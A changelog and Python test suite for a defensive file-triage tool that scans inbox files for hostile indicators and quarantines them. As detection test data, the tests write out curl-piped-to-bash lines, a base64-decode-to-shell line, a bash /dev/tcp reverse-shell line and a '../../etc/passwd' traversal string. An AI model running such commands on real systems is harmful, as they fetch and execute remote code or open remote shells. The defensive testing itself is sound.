# Changelog


## 2.1.1
### Fixed
- shell_reference: the word "dash" no longer matches inside "em—dash",
  "en–dash", "hyphen-dash", or after a math minus — typographic dashes act
  as word boundaries, so ordinary prose (e.g. typography.txt: "an em—dash")
  was being routed to review/ as a shell reference. `\bdash\b` became
  `\b(?<![\u2010-\u2015\u2212-])dash\b`; "dash" as an actual shell is still
  flagged. Two regression tests added (suite: 53 → 55).

### Added
- scripts/hq.py — the read-only command center referenced by commands.sh
  (inbox queue, risk breakdown, recent scans, quarantine/review counts,
  audit-event tail).
- scripts/validate.sh — end-to-end acceptance check (unit tests + live
  routing verification of clean/curl|bash/bidi files).
- deploy/inbox-triage.service — hardened systemd **user** unit for watch mode.
- .gitignore, .github/workflows/ci.yml (Python 3.10–3.13 matrix),
  config.example.json, DEPLOY.md quick-start.

## 2.1.0 
### Fixed
- analyze_syntax and analyze_structure no longer crash when called withouta prior encoding stage (defensive report access) — found by the testsuite: 3 errors, one root cause, plus one latent instance.

### Added
- Desktop notifications on medium/high routing and workflow failure(notify-send on Linux, osascript on macOS, silent no-op elsewhere)
- "notifications" config section: enabled, min_severity
- pyproject.toml — installable package with a triage console command


## 2.0.1
### Fixed
- analyze_base64_blobs: padding-corrected decoding (60-char blobs now decode)
- analyze_entropy: replaced unreachable text-entropy check with a
  recognized-format-aware check for unknown packed/encrypted binaries
- analyze_header_signatures: no longer assumes report["encoding"] exists
### Added
- Execute bits stripped from files at claim time (content untouched)

## 2.0.0
Initial corrected release: all C1-C4/H1-H4/M1-M13 fixes from the validation
audit, P3 feature parity, SQLite reporting, JSON configuration, sort rules.
```

---

## 2.1 `tests/test_inbox_triage.py`

```python
#!/usr/bin/env python3
"""Test suite for inbox_triage.py (v2.0.1).

Unit tests import the module directly; end-to-end tests run the CLI as a
subprocess against a temporary root. No network, no ClamAV installation,
and no execution of any analyzed file is required.

Run:  python3 -m unittest discover -s tests -v
"""

from __future__ import annotations

import copy
import fcntl
import json
import random
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import inbox_triage as it  # noqa: E402

SCRIPT = Path(__file__).resolve().parents[1] / "inbox_triage.py"

# Deliberately boring text: no pattern words, ASCII, > 1 KiB so the
# entropy stage has enough data.
CLEAN_TEXT = ("This is an ordinary document about quarterly planning. "
              "It contains no indicators of any kind.\n") * 24


# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------

def make_report() -> dict:
    return {"findings": []}


def make_cfg(**overrides) -> dict:
    cfg = copy.deepcopy(it.DEFAULT_CONFIG)
    cfg["scanners"]["clamav"] = False          # hermetic: no external AV
    cfg["stability"] = {"interval": 0.01, "checks": 1}
    for key, value in overrides.items():
        if isinstance(value, dict) and isinstance(cfg.get(key), dict):
            cfg[key].update(value)
        else:
            cfg[key] = value
    return cfg


def write_config(directory: Path, cfg: dict) -> Path:
    path = Path(directory) / "config.json"
    path.write_text(json.dumps(cfg), encoding="utf-8")
    return path


def run_cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(SCRIPT), *args],
                          capture_output=True, text=True, check=False)


def run_once(root: Path, config: Path | None = None
             ) -> subprocess.CompletedProcess:
    cmd = [sys.executable, str(SCRIPT), "--root", str(root)]
    if config is not None:
        cmd += ["--config", str(config)]
    cmd.append("--once")
    return subprocess.run(cmd, capture_output=True, text=True, check=False)


def make_pe_blob() -> bytes:
    blob = bytearray(0x100)
    blob[0:2] = b"MZ"
    blob[0x3C:0x40] = (0x80).to_bytes(4, "little")
    blob[0x80:0x84] = b"PE\x00\x00"
    return bytes(blob)


# ----------------------------------------------------------------------
# Unit: stability detection (C1 regression)
# ----------------------------------------------------------------------

class StabilityTests(unittest.TestCase):

    def test_unchanged_file_is_stable(self):
        with tempfile.TemporaryDirectory() as td:
            inbox = Path(td)
            (inbox / "f.txt").write_text("hello", encoding="utf-8")
            stable, rejected = it.select_stable_files(
                inbox, checks=2, interval=0.001, ignore_patterns=[])
            self.assertEqual(len(stable), 1)
            self.assertEqual(rejected, [])

    def test_file_that_changes_between_passes_is_not_stable(self):
        with tempfile.TemporaryDirectory() as td:
            inbox = Path(td)
            f = inbox / "f.txt"
            f.write_bytes(b"x" * 10)
            real_sleep = it.time.sleep

            def grow_once(seconds):
                f.write_bytes(b"x" * 100)   # grows inside observation window
                real_sleep(seconds)

            with mock.patch.object(it.time, "sleep", side_effect=grow_once):
                stable, _ = it.select_stable_files(
                    inbox, checks=2, interval=0.001, ignore_patterns=[])
            self.assertEqual(stable, [])

    def test_symlink_is_rejected_not_stable(self):
        with tempfile.TemporaryDirectory() as td:
            inbox = Path(td)
            (inbox / "real.txt").write_text("t", encoding="utf-8")
            (inbox / "link").symlink_to(inbox / "real.txt")
            stable, rejected = it.select_stable_files(
                inbox, checks=1, interval=0.01, ignore_patterns=[])
            self.assertIn(inbox / "real.txt", stable)
            self.assertIn(inbox / "link", rejected)

    def test_ignore_patterns_skip_incomplete_downloads(self):
        with tempfile.TemporaryDirectory() as td:
            inbox = Path(td)
            (inbox / "movie.mp4.crdownload").write_bytes(b"x")
            stable, rejected = it.select_stable_files(
                inbox, checks=1, interval=0.01,
                ignore_patterns=it.DEFAULT_CONFIG["ignore_patterns"])
            self.assertEqual(stable, [])
            self.assertEqual(rejected, [])


# ----------------------------------------------------------------------
# Unit: header signatures (C2 regression)
# ----------------------------------------------------------------------

class SignatureTests(unittest.TestCase):

    def test_mz_in_prose_is_not_pe(self):
        report = make_report()
        raw = b"Discussion of the MZ header in PE file documentation.\n" * 20
        matched = it.analyze_header_signatures(raw, ".txt", report)
        self.assertEqual(matched, set())
        self.assertEqual([f for f in report["findings"]
                          if f["category"] == "embedded_signature"], [])

    def test_real_pe_header_detected(self):
        report = make_report()
        matched = it.analyze_header_signatures(make_pe_blob(), ".bin", report)
        self.assertEqual(matched, {"PE"})
        self.assertEqual(report["findings"][0]["severity"], "high")

    def test_mz_without_valid_pe_still_flagged_as_dos(self):
        blob = bytearray(0x100)
        blob[0:2] = b"MZ"
        blob[0x3C:0x40] = (0xFFFFFFF0).to_bytes(4, "little")
        report = make_report()
        matched = it.analyze_header_signatures(bytes(blob), ".bin", report)
        self.assertEqual(matched, {"DOS-exe"})
        self.assertEqual(report["findings"][0]["severity"], "high")

    def test_cafebabe_java_class(self):
        raw = b"\xca\xfe\xba\xbe" + bytes([0, 0, 0, 52]) + b"\x00" * 64
        report = make_report()
        matched = it.analyze_header_signatures(raw, ".class", report)
        self.assertIn("Java-class", matched)

    def test_cafebabe_macho_fat(self):
        raw = b"\xca\xfe\xba\xbe" + bytes([0, 1, 0x01, 0xFF]) + b"\x00" * 64
        report = make_report()
        matched = it.analyze_header_signatures(raw, ".bin", report)
        self.assertIn("Mach-O-FAT", matched)

    def test_ooxml_zip_is_expected_container(self):
        raw = b"PK\x03\x04" + b"\x00" * 100
        report = make_report()
        matched = it.analyze_header_signatures(raw, ".docx", report)
        self.assertEqual(matched, {"ZIP"})
        self.assertEqual(report["findings"], [])
        self.assertIn("container", report["encoding"])

    def test_plain_zip_is_medium_finding(self):
        raw = b"PK\x03\x04" + b"\x00" * 100
        report = make_report()
        matched = it.analyze_header_signatures(raw, ".txt", report)
        self.assertEqual(matched, {"ZIP"})
        self.assertEqual(report["findings"][0]["severity"], "medium")


# ----------------------------------------------------------------------
# Unit: pattern severity policy (H1 regression)
# ----------------------------------------------------------------------

class PatternTests(unittest.TestCase):

    def test_prose_mentioning_curl_is_medium_not_high(self):
        report = make_report()
        it.analyze_patterns("You can use curl to fetch pages.\n", report)
        self.assertEqual([f["severity"] for f in report["findings"]],
                         ["medium"])

    def test_curl_piped_to_bash_is_high(self):
        report = make_report()
        it.analyze_patterns("curl http://x.invalid/a | bash\n", report)
        self.assertIn("high", {f["severity"] for f in report["findings"]})

    def test_base64_decode_piped_to_shell_is_high(self):
        report = make_report()
        it.analyze_patterns("echo aGk= | base64 -d | sh\n", report)
        self.assertIn("high", {f["severity"] for f in report["findings"]})

    def test_bash_dev_tcp_is_high(self):
        report = make_report()
        it.analyze_patterns("exec 3<>/dev/tcp/10.0.0.1/4444\n", report)
        self.assertIn("high", {f["severity"] for f in report["findings"]})

    def test_prose_mentioning_bash_is_medium_only(self):
        report = make_report()
        it.analyze_patterns("To run the script, type bash run.sh.\n", report)
        self.assertEqual({f["severity"] for f in report["findings"]},
                         {"medium"})


# ----------------------------------------------------------------------
# Unit: Unicode policy (M3 regression + the original em-dash case)
# ----------------------------------------------------------------------

class UnicodeTests(unittest.TestCase):

    def test_em_dash_is_not_a_finding(self):
        report = make_report()
        it.analyze_unicode_chars("risk\u2014not an invented standard", report)
        self.assertEqual(report["findings"], [])

    def test_bidi_override_is_high(self):
        report = make_report()
        it.analyze_unicode_chars("safe\u202etxet tcejbO", report)
        self.assertEqual(report["findings"][0]["severity"], "high")

    def test_zero_width_space_is_high(self):
        report = make_report()
        it.analyze_unicode_chars("invis\u200bible", report)
        self.assertEqual(report["findings"][0]["severity"], "high")

    def test_soft_hyphen_is_medium(self):
        report = make_report()
        it.analyze_unicode_chars("invis\u00adible", report)
        self.assertEqual(report["findings"][0]["severity"], "medium")

    def test_cyrillic_homoglyph_is_medium(self):
        report = make_report()
        it.analyze_unicode_chars("p\u0430ssword", report)
        self.assertEqual(report["findings"][0]["severity"], "medium")


class EncodingTests(unittest.TestCase):

    def test_bom_is_benign(self):
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "bom.txt"
            p.write_bytes(b"\xef\xbb\xbf" + CLEAN_TEXT.encode("utf-8"))
            report = make_report()
            it.analyze_file(p, report, make_cfg())
            self.assertTrue(report["encoding"]["bom"])
            self.assertFalse(any(f["severity"] == "high"
                                 for f in report["findings"]))
            self.assertEqual([f for f in report["findings"]
                              if f["category"] == "unicode"], [])


# ----------------------------------------------------------------------
# Unit: base64 blobs and entropy (Errata 1 and 2)
# ----------------------------------------------------------------------

class Base64Tests(unittest.TestCase):

    def test_blob_reported_with_hex_head(self):
        report = make_report()
        it.analyze_base64_blobs("data: " + "A" * 60 + " end", report)
        self.assertEqual(len(report["findings"]), 1)
        finding = report["findings"][0]
        self.assertEqual(finding["category"], "base64_blob")
        self.assertIn("decodes to:", finding["description"])


class EntropyTests(unittest.TestCase):

    def test_unknown_high_entropy_binary_flagged(self):
        rng = random.Random(42)
        report = make_report()
        report["encoding"] = {"utf8_valid": False}
        it.analyze_entropy(rng.randbytes(4096), set(), report)
        self.assertEqual(len(report["findings"]), 1)
        self.assertEqual(report["findings"][0]["category"], "entropy")
        self.assertGreater(report["encoding"]["entropy_bits_per_byte"], 7.5)

    def test_recognized_format_high_entropy_not_flagged(self):
        rng = random.Random(42)
        raw = b"\x89PNG\r\n\x1a\n" + rng.randbytes(4088)
        report = make_report()
        report["encoding"] = {"utf8_valid": False}
        it.analyze_entropy(raw, {"PNG"}, report)
        self.assertEqual(report["findings"], [])
        self.assertIn("entropy_bits_per_byte", report["encoding"])


# ----------------------------------------------------------------------
# Unit: syntax checks (parse-only)
# ----------------------------------------------------------------------

class SyntaxTests(unittest.TestCase):

    def test_python_syntax_error_reported(self):
        report = make_report()
        it.analyze_syntax(Path("x.py"), "def broken(:\n", report, make_cfg())
        self.assertTrue(any(f["category"] == "syntax"
                            for f in report["findings"]))

    def test_valid_python_no_finding(self):
        report = make_report()
        it.analyze_syntax(Path("x.py"), "x = 1\n", report, make_cfg())
        self.assertEqual(report["syntax"]["python"], "valid")
        self.assertEqual(report["findings"], [])

    @unittest.skipUnless(shutil.which("bash"), "bash not installed")
    def test_bash_syntax_error_reported(self):
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "bad.sh"
            p.write_text("if true\n", encoding="utf-8")
            report = make_report()
            it.analyze_syntax(p, "if true\n", report, make_cfg())
            self.assertTrue(any(f["category"] == "syntax"
                                for f in report["findings"]))


# ----------------------------------------------------------------------
# Unit: ClamAV return-code semantics (H2 regression, mocked)
# ----------------------------------------------------------------------

class ClamAvTests(unittest.TestCase):

    def _scan_with(self, return_code):
        report = make_report()
        response = {"available": True, "return_code": return_code,
                    "stdout": "", "stderr": ""}
        cfg = make_cfg(scanners={"clamav": True})
        with mock.patch.object(it, "run_command", return_value=response):
            it.run_external_scanners(Path("/dev/null"), report, cfg)
        return [f for f in report["findings"]
                if f["category"] == "antivirus"]

    def test_detection_is_high(self):
        self.assertEqual(self._scan_with(1)[0]["severity"], "high")

    def test_scanner_error_is_medium_unverified(self):
        self.assertEqual(self._scan_with(2)[0]["severity"], "medium")

    def test_clean_is_no_finding(self):
        self.assertEqual(self._scan_with(0), [])


# ----------------------------------------------------------------------
# Unit: naming, policy, config, database
# ----------------------------------------------------------------------

class NamingAndPolicyTests(unittest.TestCase):

    def test_determine_risk_precedence(self):
        self.assertEqual(it.determine_risk({"findings": []}), "clean")
        self.assertEqual(it.determine_risk(
            {"findings": [{"severity": "low"}]}), "low")
        self.assertEqual(it.determine_risk(
            {"findings": [{"severity": "low"},
                          {"severity": "medium"}]}), "medium")
        self.assertEqual(it.determine_risk(
            {"findings": [{"severity": "medium"},
                          {"severity": "high"}]}), "high")

    def test_safe_name_blocks_traversal(self):
        for evil in ("../../etc/passwd", "/etc/passwd", ".."):
            name = it.safe_name(evil)
            self.assertNotIn("/", name)
            self.assertNotIn(name, {".", ".."})
            self.assertFalse(Path(name).is_absolute())

    def test_unique_destination_never_overwrites(self):
        with tempfile.TemporaryDirectory() as td:
            d = Path(td)
            first = it.unique_destination(d, "a.txt")
            first.write_text("x", encoding="utf-8")
            second = it.unique_destination(d, "a.txt")
            self.assertNotEqual(first, second)
            self.assertFalse(second.exists())

    def test_sort_rule_traversal_rejected(self):
        cfg = copy.deepcopy(it.DEFAULT_CONFIG)
        cfg["sort_rules"] = [{"match": "*", "destination": "../evil"}]
        with self.assertRaises(SystemExit):
            it.validate_config(cfg)

    def test_unknown_routing_target_rejected(self):
        cfg = copy.deepcopy(it.DEFAULT_CONFIG)
        cfg["routing"]["clean"] = "nowhere"
        with self.assertRaises(SystemExit):
            it.validate_config(cfg)

    def test_apply_sort_rules_first_match_wins(self):
        rules = [
            {"match": ["*.pdf", "doc-*"], "destination": "docs"},
            {"match": "*", "destination": "misc"},
        ]
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            self.assertEqual(it.apply_sort_rules("report.pdf", rules, root),
                             root / "docs")
            self.assertEqual(it.apply_sort_rules("notes.txt", rules, root),
                             root / "misc")


class ConfigTests(unittest.TestCase):

    def test_load_config_merges_and_validates(self):
        with tempfile.TemporaryDirectory() as td:
            user = {"stability": {"checks": 3}, "routing": {"low": "review"}}
            path = Path(td) / "c.json"
            path.write_text(json.dumps(user), encoding="utf-8")
            cfg = it.load_config(path)
            self.assertEqual(cfg["stability"]["checks"], 3)
            self.assertEqual(cfg["stability"]["interval"],
                             it.DEFAULT_CONFIG["stability"]["interval"])
            self.assertEqual(cfg["routing"]["low"], "review")
            self.assertEqual(cfg["routing"]["clean"], "sorted")


class DatabaseTests(unittest.TestCase):

    def test_seen_hash_roundtrip(self):
        with tempfile.TemporaryDirectory() as td:
            db = it.Database(Path(td) / "t.db")
            try:
                report = {"run_id": "r1", "original_name": "a.txt",
                          "claimed_name": "a.txt", "sha256": "h" * 64,
                          "size": 10, "risk": "clean", "findings": [],
                          "started": None, "finished": None}
                db.record_scan(report, None, None, None)
                row = db.seen_hash("h" * 64)
                self.assertIsNotNone(row)
                self.assertEqual(row["run_id"], "r1")
                self.assertIsNone(db.seen_hash("deadbeef"))
            finally:
                db.close()


# ----------------------------------------------------------------------
# End-to-end: full CLI runs against a temporary root
# ----------------------------------------------------------------------

class EndToEnd(unittest.TestCase):

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.td = Path(self._tmp.name)
        self.root = self.td / "data"
        self.inbox = self.root / "inbox"
        self.inbox.mkdir(parents=True)
        self.config = write_config(self.td, make_cfg())

    def tearDown(self):
        self._tmp.cleanup()

    def db_query(self, sql: str) -> list[tuple]:
        db = self.root / "logs" / "triage.db"
        conn = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        try:
            return conn.execute(sql).fetchall()
        finally:
            conn.close()

    def test_clean_text_sorted(self):
        (self.inbox / "notes.txt").write_text(CLEAN_TEXT, encoding="utf-8")
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_OK, result.stderr)
        self.assertEqual(len(list((self.root / "sorted").iterdir())), 1)
        self.assertEqual(self.db_query("SELECT risk FROM scans"),
                         [("clean",)])
        events = (self.root / "logs" / "events.jsonl").read_text()
        self.assertIn('"event": "routed"', events)

    def test_curl_pipe_bash_quarantined(self):
        (self.inbox / "dl.sh").write_text(
            "curl https://example.invalid/p | bash\n", encoding="utf-8")
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_FINDINGS)
        self.assertEqual(len(list((self.root / "quarantine").iterdir())), 1)
        self.assertEqual([r[0] for r in self.db_query("SELECT risk FROM scans")],
                         ["high"])

    def test_mz_in_prose_is_sorted_not_quarantined(self):
        (self.inbox / "docs.txt").write_text(
            "Discussion of the MZ header in PE file documentation.\n" * 20,
            encoding="utf-8")
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_OK, result.stderr)
        self.assertEqual(len(list((self.root / "quarantine").iterdir())), 0)
        self.assertEqual(len(list((self.root / "sorted").iterdir())), 1)

    def test_em_dash_text_is_clean(self):
        (self.inbox / "llm.txt").write_text(
            "Evaluate results against my actual objective, capital, costs, "
            "and risk\u2014not an invented institutional standard.\n" * 10,
            encoding="utf-8")
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_OK, result.stderr)
        self.assertEqual(len(list((self.root / "sorted").iterdir())), 1)

    def test_rlo_text_quarantined(self):
        (self.inbox / "spoof.txt").write_text(
            "safe\u202etxet tcejbO\n" * 5, encoding="utf-8")
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_FINDINGS)
        self.assertEqual(len(list((self.root / "quarantine").iterdir())), 1)

    def test_real_pe_quarantined(self):
        (self.inbox / "payload.bin").write_bytes(make_pe_blob())
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_FINDINGS)
        self.assertEqual(len(list((self.root / "quarantine").iterdir())), 1)

    def test_symlink_in_inbox_routed_to_errors(self):
        target = self.td / "outside.txt"
        target.write_text("target\n", encoding="utf-8")
        (self.inbox / "link.txt").symlink_to(target)
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_FINDINGS)
        self.assertEqual(len(list((self.root / "errors").iterdir())), 1)
        self.assertEqual(len(list(self.inbox.iterdir())), 0)
        self.assertTrue(target.exists())

    def test_oversized_rejected(self):
        config = write_config(self.td, make_cfg(max_input_bytes=100))
        (self.inbox / "big.txt").write_text("x" * 500, encoding="utf-8")
        result = run_once(self.root, config)
        self.assertEqual(result.returncode, it.EXIT_FAILURE)
        self.assertEqual(len(list((self.root / "errors").iterdir())), 1)
        self.assertEqual(
            self.db_query("SELECT event FROM events WHERE event='rejected'"),
            [("rejected",)])

    def test_duplicates_routed(self):
        config = write_config(
            self.td, make_cfg(dedup={"enabled": True, "action": "route"}))
        (self.inbox / "a.txt").write_text(CLEAN_TEXT, encoding="utf-8")
        (self.inbox / "b.txt").write_text(CLEAN_TEXT, encoding="utf-8")
        result = run_once(self.root, config)
        self.assertEqual(result.returncode, it.EXIT_OK, result.stderr)
        self.assertEqual(len(list((self.root / "sorted").iterdir())), 1)
        self.assertEqual(len(list((self.root / "duplicates").iterdir())), 1)
        self.assertIn("duplicate-routed",
                      (self.root / "logs" / "events.jsonl").read_text())

    def test_sort_rule_subdirectory(self):
        config = write_config(
            self.td, make_cfg(sort_rules=[
                {"match": "invoice-*", "destination": "finance"}]))
        (self.inbox / "invoice-2024.txt").write_text(
            CLEAN_TEXT, encoding="utf-8")
        result = run_once(self.root, config)
        self.assertEqual(result.returncode, it.EXIT_OK, result.stderr)
        self.assertTrue(
            (self.root / "sorted" / "finance" / "invoice-2024.txt").is_file())

    def test_stale_processing_recovered(self):
        (self.root / "processing").mkdir(parents=True, exist_ok=True)
        (self.root / "processing" / "stale.txt").write_text("orphan\n")
        result = run_once(self.root, self.config)
        self.assertEqual(result.returncode, it.EXIT_OK, result.stderr)
        recovered = list((self.root / "errors").iterdir())
        self.assertEqual(len(recovered), 1)
        self.assertEqual(recovered[0].name, "stale.txt")

    def test_second_instance_blocked_by_lock(self):
        lock = (self.root / ".triage.lock").open("w")
        fcntl.flock(lock.fileno(), fcntl.LOCK_EX)
        try:
            result = run_once(self.root, self.config)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("another triage instance", result.stderr)
        finally:
            fcntl.flock(lock.fileno(), fcntl.LOCK_UN)
            lock.close()

    def test_file_mode_rejects_symlink(self):
        target = self.td / "t.txt"
        target.write_text("t\n", encoding="utf-8")
        link = self.td / "l.txt"
        link.symlink_to(target)
        result = run_cli("--root", str(self.root), "--config",
                         str(self.config), "--file", str(link))
        self.assertEqual(result.returncode, it.EXIT_FAILURE)
        self.assertIn("symbolic links", result.stderr.lower())
        self.assertEqual(len(list(self.inbox.iterdir())), 0)

    def test_file_mode_preserves_original(self):
        src = self.td / "source.txt"
        src.write_text(CLEAN_TEXT, encoding="utf-8")
        result = run_cli("--root", str(self.root), "--config",
                         str(self.config), "--file", str(src))
        self.assertEqual(result.returncode, it.EXIT_OK, result.stderr)
        self.assertEqual(src.read_text(encoding="utf-8"), CLEAN_TEXT)
        self.assertEqual(len(list((self.root / "sorted").iterdir())), 1)


if __name__ == "__main__":
    unittest.main()
```
